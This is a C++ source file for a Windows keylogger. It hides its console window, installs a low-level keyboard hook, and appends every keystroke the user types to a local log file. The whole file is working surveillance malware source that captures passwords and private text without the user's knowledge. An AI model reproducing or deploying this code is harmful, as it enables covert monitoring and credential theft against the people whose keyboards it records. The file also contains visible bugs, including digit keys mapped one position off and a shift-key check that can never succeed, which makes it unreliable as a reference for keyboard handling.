#include "pch.h"

// Console IO functions
#include <iostream>

// String
#include <string>

// Time
#include <ctime>

// File handling
#include <fstream>

// Windows specific functions
#include <Windows.h>


// ---------------------------------------------------------------------------------------------

#define logFilePath "log.txt"

// Low level keyboard hook
HHOOK keyboardHook;

// Whether or not the user is currently holding the "Shift" key
bool isHoldingShift;

// The time when the user last pressed a key
clock_t lastKeyPressTime;

// The log file that we're writing key presses to
std::ofstream logFile;


// ---------------------------------------------------------------------------------------------


// Converts a code given by the Keyboard Hook into an equivalent string
std::string CodeToStr(DWORD code, bool upperCase)
{
	std::string key;

	// Code mapping can be seen here: https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes

	// Switch on the given code
	switch (code)
	{
		// A lot of this is dependant on your keyboard language. As we are operating at low level, not much we can do about that.

		// Numbers (And their +shift combinations)
		case 0x39:				key = upperCase ? ")" : "0";		break;
		case VK_NUMPAD0:		key = "0";							break;

		case 0x30:				key = upperCase ? "!" : "1";		break;
		case VK_NUMPAD1:		key = "1";							break;

		case 0x31:				key = upperCase ? "\"" : "2";		break;
		case VK_NUMPAD2:		key = "2";							break;

		case 0x32:				key = upperCase ? "£" : "3";		break;
		case VK_NUMPAD3:		key = "3";							break;

		case 0x33:				key = upperCase ? "$" : "4";		break;
		case VK_NUMPAD4:		key = "4";							break;

		case 0x34:				key = upperCase ? "%" : "5";		break;
		case VK_NUMPAD5:		key = "5";							break;

		case 0x35:				key = upperCase ? "^" : "6";		break;
		case VK_NUMPAD6:		key = "6";							break;

		case 0x36:				key = upperCase ? "&" : "7";		break;
		case VK_NUMPAD7:		key = "7";							break;

		case 0x37:				key = upperCase ? "*" : "8";		break;
		case VK_NUMPAD8:		key = "8";							break;

		case 0x38:				key = upperCase ? "(" : "9";		break;
		case VK_NUMPAD9:		key = "9";							break;

			
		// Letters
		case 0x41:				key = upperCase ? "A" : "a";		break;
		case 0x42:				key = upperCase ? "B" : "b";		break;
		case 0x43:				key = upperCase ? "C" : "c";		break;
		case 0x44:				key = upperCase ? "D" : "d";		break;
		case 0x45:				key = upperCase ? "E" : "e";		break;
		case 0x46:				key = upperCase ? "F" : "f";		break;
		case 0x47:				key = upperCase ? "G" : "g";		break;
		case 0x48:				key = upperCase ? "H" : "h";		break;
		case 0x49:				key = upperCase ? "I" : "i";		break;
		case 0x4A:				key = upperCase ? "J" : "j";		break;
		case 0x4B:				key = upperCase ? "K" : "k";		break;
		case 0x4C:				key = upperCase ? "L" : "l";		break;
		case 0x4D:				key = upperCase ? "M" : "m";		break;
		case 0x4E:				key = upperCase ? "N" : "n";		break;
		case 0x4F:				key = upperCase ? "O" : "o";		break;
		case 0x50:				key = upperCase ? "P" : "p";		break;
		case 0x51:				key = upperCase ? "Q" : "q";		break;
		case 0x52:				key = upperCase ? "R" : "r";		break;
		case 0x53:				key = upperCase ? "S" : "s";		break;
		case 0x54:				key = upperCase ? "T" : "t";		break;
		case 0x55:				key = upperCase ? "U" : "u";		break;
		case 0x56:				key = upperCase ? "V" : "v";		break;
		case 0x57:				key = upperCase ? "W" : "w";		break;
		case 0x58:				key = upperCase ? "X" : "x";		break;
		case 0x59:				key = upperCase ? "Y" : "y";		break;
		case 0x5A:				key = upperCase ? "Z" : "z";		break;


		// OEM Keys
		case VK_OEM_PLUS:		key = upperCase ? "+" : "=";		break;
		case VK_OEM_COMMA:		key = upperCase ? "<" : ",";		break;
		case VK_OEM_MINUS:		key = upperCase ? "_" : "-";		break;
		case VK_OEM_PERIOD:		key = upperCase ? ">" : ".";		break;
		case VK_OEM_1:			key = upperCase ? ":" : ";";		break;
		case VK_OEM_2:			key = upperCase ? "?" : "/";		break;
		case VK_OEM_3:			key = upperCase ? "~" : "`";		break;
		case VK_OEM_4:			key = upperCase ? "{" : "[";		break;
		case VK_OEM_5:			key = upperCase ? "\\" : "|";		break;
		case VK_OEM_6:			key = upperCase ? "}" : "]";		break;
		case VK_OEM_7:			key = upperCase ? "'" : "'";		break;


		// Miscellanous Keys
		case VK_LWIN:
		case VK_RWIN:			key = "[WIN]";						break;
		case VK_LSHIFT:
		case VK_RSHIFT:
		case VK_SHIFT:			key = "[SHIFT]";					break;
		case VK_LCONTROL:
		case VK_RCONTROL:		key = "[CTRL]";						break;
		case VK_NUMLOCK:		key = "[NUM-LOCK]";					break;
		case VK_SCROLL:			key = "[SCROLL-LOCK]";				break;
		case VK_BACK:			key = "[BACK]";						break;
		case VK_TAB:			key = "[TAB]";						break;
		case VK_CLEAR:			key = "[CLEAR]";					break;
		case VK_RETURN:			key = "[ENTER]";					break;
		case VK_CONTROL:		key = "[CTRL]";						break;
		case VK_LMENU:
		case VK_RMENU:
		case VK_MENU:			key = "[ALT]";						break;
		case VK_PAUSE:			key = "[PAUSE]";					break;
		case VK_CAPITAL:		key = "[CAP-LOCK]";					break;
		case VK_ESCAPE:			key = "[ESC]";						break;
		case VK_SPACE:			key = "[SPACE]";					break;
		case VK_PRIOR:			key = "[PAGEUP]";					break;
		case VK_NEXT:			key = "[PAGEDOWN]";					break;
		case VK_END:			key = "[END]";						break;
		case VK_HOME:			key = "[HOME]";						break;
		case VK_LEFT:			key = "[LEFT-ARROW]";				break;
		case VK_UP:				key = "[UP-ARROW]";					break;
		case VK_RIGHT:			key = "[RIGHT-ARROW]";				break;
		case VK_DOWN:			key = "[DOWN-ARROW]";				break;
		case VK_SNAPSHOT:		key = "[PRTSCRN]";					break;
		case VK_INSERT:			key = "[INSERT]";					break;
		case VK_DELETE:			key = "[DELETE]";					break;

		// If the key wasn't recognised
		default:				key = "[UNKNOWN-KEY]";				break;
	}

	return key;
}


// Callback executed by our keyboard hook
LRESULT CALLBACK hookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	// If this is on key down (don't register on key up events or each key will be registered twice)
	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
	{
		// First check whether or not the pressed key is uppercase or lowercase

		// Get state of capslock and shift keys
		bool capslock = (GetKeyState(VK_CAPITAL) & 0x0001) == 1;
		bool shift = (GetKeyState(VK_SHIFT) & 0x8000) < 0;

		// Whether or not the user is currently typing in uppercase
		bool uppercase = false;

		// If shift XOR capslock are currently active then chars will be uppercase
		if (shift ^ capslock)
		{
			uppercase = true;
		}


		// Cast lParam to KBDLLHOOKSTRUCT
		KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

		// Convert the virtual key code to a string representation
		std::string keyStr = CodeToStr(kbdStruct.vkCode, uppercase);

		// If it has been a while since the last key press signifiy this with a new line
		if (lastKeyPressTime == NULL || (float(clock() - lastKeyPressTime) / CLOCKS_PER_SEC) > 2.5)
			keyStr = keyStr + "\n";

		// Now we write this key to the log file
		logFile << keyStr;

		lastKeyPressTime = clock();
	}

	// Call next hook
	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}


// On program run
int main() {
	
	// First we remove the console window
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);
	
	// Now we register a low level keyboard hook with windows
	keyboardHook = SetWindowsHookEx(
		WH_KEYBOARD_LL,			// We want keyboard events
		hookCallback,			// A pointer to our callback function
		GetModuleHandle(NULL),	// A handle to the ddl containing the callback function
		NULL					// Thread containing callback function
	);

	// If we successfully hooked to the keyboard
	if (keyboardHook)
	{
		// Initiate our handle to the log file
		logFile.open(logFilePath, std::ios::app);
		if (logFile.fail())
			std::cout << "Failed to open file";

		// Stay in the program until we're told to stop
		MSG msg;
		while (!GetMessage(&msg, NULL, NULL, NULL)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	// Release keyboard hook
	UnhookWindowsHookEx(keyboardHook);

	// Quit program
	return 0;
}